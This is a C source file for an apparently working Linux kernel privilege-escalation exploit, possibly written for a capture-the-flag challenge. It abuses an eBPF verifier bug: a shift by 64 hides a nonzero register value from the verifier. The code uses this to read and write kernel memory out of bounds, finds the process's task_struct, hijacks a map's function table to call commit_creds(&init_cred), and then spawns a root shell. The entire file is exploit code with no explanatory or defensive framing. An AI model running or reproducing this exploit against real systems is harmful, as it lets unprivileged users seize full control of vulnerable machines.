// x86_64-buildroot-linux-uclibc-cc core.c bpf_def.c bpf_def.h task_struct_search.h task_struct_search.c kernel_def.h -Os -static -s -o exp
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <sys/types.h>
#include "kernel_def.h"
#include "bpf_def.h"
#include "task_struct_search.h"

void error_exit(const char *msg)
{
    puts(msg);
    exit(1);
}

#define OFFSET_FROM_DATA_TO_BPF_MAP_BTF             0xD0
#define OFFSET_FROM_DATA_TO_BTF_ID                  0x58
#define OFFSET_FROM_DATA_TO_PRIVATE_DATA_TOP        0x110
#define OFFSET_FROM_MAP_OPS_TO_WORK_FOR_CPU_FN      0xFFFFFFFFFF085DF0
#define OFFSET_FROM_MAP_OPS_TO_COMMIT_CREDS         0xFFFFFFFFFF096A90
#define OFFSET_FROM_MAP_OPS_TO_INIT_CRED            0xA354E0
#define OFFSET_FROM_MAP_OPS_TO_INIT_PID_NS          0xA34F20
#define FILES_OFFSET_IN_TASK_STRUCT                 0xB30
#define FD_ARRAY_OFFSET_IN_FILES_STRUCT             0xA0
#define PRIVATE_DATA_OFFSET_IN_FILE_STRUCT          0xC8

#define CONST_REG   BPF_REG_9
#define EXP_REG     BPF_REG_8
#define OOB_REG     BPF_REG_7
#define STORE_REG   BPF_REG_6

#define trigger_bug(oob_map_fd, store_map_fd) \
    /* OOB_REG = &oob_map[0] */ \
    BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),       \
    BPF_MOV64_IMM(BPF_REG_0, 0),        \
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),      \
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),       \
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),      \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),        \
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),      \
    BPF_EXIT_INSN(), /* if (map_lookup_elem(oob_map, 0, &oob_map[0]) == NULL) goto out; */      \
    BPF_MOV64_REG(OOB_REG, BPF_REG_0),      \
    /* STORE_REG = &map_store[0] */     \
    BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),     \
    BPF_MOV64_IMM(BPF_REG_0, 0),        \
    BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),      \
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),       \
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),      \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),        \
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),      \
    BPF_EXIT_INSN(), /* if (map_lookup_elem(store_map_fd, &key, &value) == 0) goto out; */      \
    BPF_MOV64_REG(STORE_REG, BPF_REG_0),        \
    /* trigger the bug */       \
    BPF_MOV64_IMM(CONST_REG, 64),     \
    BPF_MOV64_IMM(EXP_REG, 0x1),      \
    /* make exp_reg believed to be 0, in fact 1 */     \
    BPF_ALU64_REG(BPF_RSH, EXP_REG, CONST_REG),      \
    BPF_MOV64_REG(BPF_REG_0, EXP_REG),       \
    BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),    \
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),    \
    BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),      \
    BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG)

static int setup_btf_bpf_prog_fd;

uint32_t read_kernel_uint32(int oob_map_fd, int store_map_fd, uint64_t addr)
{
    char vals[0x1337] = {0};
    struct bpf_map_info_kernel info = {0};
    union bpf_attr attr = {
        .info.bpf_fd = oob_map_fd,
        .info.info = (long long unsigned int) &info,
        .info.info_len = sizeof(info)
    };

    struct bpf_insn setup_btf[] = {
        trigger_bug(oob_map_fd, store_map_fd),
        BPF_ALU64_IMM(BPF_MUL, EXP_REG, OFFSET_FROM_DATA_TO_BPF_MAP_BTF),
        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 8),
        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    ((uint64_t*) &vals[8])[0] = addr - OFFSET_FROM_DATA_TO_BTF_ID;
    if (addr == 0)
    {
        ((uint64_t*) &vals[8])[0] = 0;
    }
    if (0 != update_map_element(store_map_fd, 0, vals, BPF_ANY))
    {
        error_exit("[-] Failed to update map element\n");
    }

    if (0 != run_bpf_prog(setup_btf, sizeof(setup_btf) / sizeof(setup_btf[0]), &setup_btf_bpf_prog_fd))
    {
        error_exit("[-] Failed to run bpf program\n");
    }

    if (addr != 0 && 0 != obj_get_info_by_fd(&attr))
    {
        error_exit("[-] Failed to get map info\n");
    }

    return info.btf_id;
}

void read_kernel(int oob_map_fd, int store_map_fd, uint64_t start_addr, uint64_t len, void* buf)
{
    for (int i = 0; i < len / 4; i ++)
    {
        uint32_t btf_id = read_kernel_uint32(oob_map_fd, store_map_fd, start_addr + i * 4);
        ((uint32_t*) buf)[i] = btf_id;
    }
}

void get_root()
{
    if (getuid() != 0)
    {
        error_exit("[-] didn't got root\n");
    }
    else
    {
        printf("[+] got root\n");
        system("/bin/sh");
    }
}

int main()
{
    pid_t pid = getpid();
    printf("[+] pid: 0x%x\n", pid);

    union bpf_attr map_attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = sizeof(int),
        .value_size = 0x1337,
        .max_entries = 1
    };

    // store_map[0] === 0, store_map[1] = &oob_map[0]
    int store_map_fd = create_map(&map_attr);
    int oob_map_fd = create_map(&map_attr);

    char vals[0x1337] = {0};

    if (store_map_fd < 0 || oob_map_fd < 0)
    {
        error_exit("Failed to create map\n");
    }

    if (0 != update_map_element(oob_map_fd, 0, vals, BPF_ANY))
    {
        error_exit("[-] failed to update map element values!\n");
    }

    if (0 != update_map_element(store_map_fd, 0, vals, BPF_ANY))
    {
        error_exit("[-] failed to update map element values!\n");
    }

    struct bpf_insn read_map_ops[] = {
        trigger_bug(oob_map_fd, store_map_fd),
        BPF_ALU64_IMM(BPF_MUL, EXP_REG, OFFSET_FROM_DATA_TO_PRIVATE_DATA_TOP),
        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, 0),
        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, 8),
        BPF_EXIT_INSN()
    };

    if (0 != run_bpf_prog(read_map_ops, sizeof(read_map_ops) / sizeof(struct bpf_insn), NULL))
    {
        error_exit("[-] Failed to run bpf program\n");
    }

    if (0 != lookup_map_element(store_map_fd, 0, vals))
    {
        error_exit("[-] Failed to lookup map element\n");
    }

    uint64_t array_map_ops_addr     = ((uint64_t*) (&vals[8]))[0];
    uint64_t work_for_cpu_fn_addr   = array_map_ops_addr + OFFSET_FROM_MAP_OPS_TO_WORK_FOR_CPU_FN;
    uint64_t commit_creds_addr      = array_map_ops_addr + OFFSET_FROM_MAP_OPS_TO_COMMIT_CREDS;
    uint64_t init_cred_addr         = array_map_ops_addr + OFFSET_FROM_MAP_OPS_TO_INIT_CRED;
    uint64_t init_pid_ns_addr       = array_map_ops_addr + OFFSET_FROM_MAP_OPS_TO_INIT_PID_NS;
    printf("[+] map_ops addr: 0x%lx\n", array_map_ops_addr);
    printf("[+] work_for_cpu_fn addr: 0x%lx\n", work_for_cpu_fn_addr);
    printf("[+] commit_creds addr: 0x%lx\n", commit_creds_addr);
    printf("[+] init_cred addr: 0x%lx\n", init_cred_addr);
    printf("[+] init_pid_ns addr: 0x%lx\n", init_pid_ns_addr);

    // test
    uint64_t leaked_val;
    read_kernel(oob_map_fd, store_map_fd, array_map_ops_addr, sizeof(uint64_t), &leaked_val);
    printf("[!] leaked 0x%lx\n", leaked_val);

    // get the task_struct addr
    uint64_t task_struct_addr = find_task_struct_by_pid_ns(oob_map_fd, store_map_fd, pid, (void *)init_pid_ns_addr);
    printf("[+] task_struct addr: 0x%lx\n", task_struct_addr);

    // get the val of files ptr
    uint64_t files_ptr_val;
    read_kernel(oob_map_fd, store_map_fd, task_struct_addr + FILES_OFFSET_IN_TASK_STRUCT, sizeof(uint64_t), &files_ptr_val);
    printf("[+] files_ptr_val: 0x%lx\n", files_ptr_val);

    // get the oob_map_file_addr
    uint64_t oob_map_file_addr;
    read_kernel(oob_map_fd, store_map_fd, files_ptr_val + FD_ARRAY_OFFSET_IN_FILES_STRUCT + 8 * oob_map_fd, sizeof(uint64_t), &oob_map_file_addr);
    printf("[+] oob_map_file_addr: 0x%lx\n", oob_map_file_addr);

    // get the oob_map_addr
    uint64_t oob_map_addr; // addr of the datas in the oob_map
    read_kernel(oob_map_fd, store_map_fd, oob_map_file_addr + PRIVATE_DATA_OFFSET_IN_FILE_STRUCT, sizeof(uint64_t), &oob_map_addr);
    oob_map_addr += OFFSET_FROM_DATA_TO_PRIVATE_DATA_TOP;
    printf("[+] oob_map_addr: 0x%lx\n", oob_map_addr);

    uint64_t array_map_ops[0x100] = {0};
    // read all the map_ops
    read_kernel(oob_map_fd, store_map_fd, array_map_ops_addr, 240, array_map_ops);
    array_map_ops[4] = work_for_cpu_fn_addr; // point map_get_next_key to work_for_cpu_fn
    // do a cleanup first
    read_kernel_uint32(oob_map_fd, store_map_fd, 0);
    // write the map_ops to oob_map
    if (0 != update_map_element(oob_map_fd, 0, array_map_ops, BPF_ANY))
    {
        error_exit("[-] failed to update map element values!\n");
    }

    struct bpf_insn modify_oob_map[] = {
        trigger_bug(oob_map_fd, store_map_fd),
        BPF_ALU64_IMM(BPF_MUL, EXP_REG, OFFSET_FROM_DATA_TO_PRIVATE_DATA_TOP),
        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 0x20),
        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0x20),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 0x28),
        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0x28),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 0x30),
        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    ((uint64_t*)vals)[4] = commit_creds_addr;
    ((uint64_t*)vals)[5] = init_cred_addr;
    ((uint64_t*)vals)[6] = oob_map_addr;
    if (0 != update_map_element(store_map_fd, 0, vals, BPF_ANY))
    {
        error_exit("[-] failed to update map element values!\n");
    }

    if (0 != run_bpf_prog(modify_oob_map, sizeof(modify_oob_map) / sizeof(struct bpf_insn), NULL))
    {
        error_exit("[-] Failed to run bpf program\n");
    }
    printf("[+] updated oob_map\n");

    uint64_t key = 0, next_key;
    union bpf_attr attr = {
        .map_fd = oob_map_fd,
        .key = &key,
        .next_key = &next_key
    };
    map_get_next_key(&attr);
    printf("[+] commit_cred(&init_cred) done!\n");

    get_root();
    
    // simple cleanup
    read_kernel_uint32(oob_map_fd, store_map_fd, 0);

    return 0;
}
